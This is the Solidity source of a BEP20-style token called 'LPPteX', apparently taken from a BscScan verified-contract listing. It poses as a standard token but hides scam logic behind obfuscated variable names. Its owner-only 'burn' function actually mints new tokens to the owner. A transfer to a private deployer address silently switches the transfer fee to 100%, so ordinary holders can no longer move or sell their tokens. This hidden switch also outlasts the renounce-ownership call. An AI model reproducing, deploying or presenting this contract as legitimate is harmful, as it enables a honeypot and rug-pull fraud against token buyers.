/**
 *Submitted for verification at BscScan.com on 2022-12-05
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.6.4;
contract LPPteX {
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  Vqptcr = 100000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
string public  symbol = "LPPteX";
uint256 private  PGTqIh = 10000000000000;
address public  Fecxmd = address(0);
uint8 public constant decimals = 18;
uint256 public  qtsGgu = 10000000000000000000;
mapping (address => uint256) public balanceOf;
address public  uKBatO = address(0);
uint256 public  IxtpXA = 10000000000000000000000000000;
uint256 public  qHCdkQ = 100000000000000000000000;
address public  AkqpPC = address(0);
address public owner;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  asrnzN = 1000000000000000000;
uint256 public constant YNsezT = 9+1;
address private  PCfaKg = address(0);
uint256 public  GxNsZV = 100000000000000000000000;
uint256 public  DQRxar = 10000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public  tVYSOV = address(0);
string public  name = "LPPteX";
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  wezMBz = 100000000000000000000;
address public  wUChaY = address(0);
address public  ZrTsUi = address(0);
constructor () public {
PCfaKg = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "YYdMBZ");
require(to != address(0), "YYdMBZ");
require(amount <= balanceOf[from], "YYdMBZ");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* YNsezT/PGTqIh ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==PCfaKg){
PGTqIh = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}

}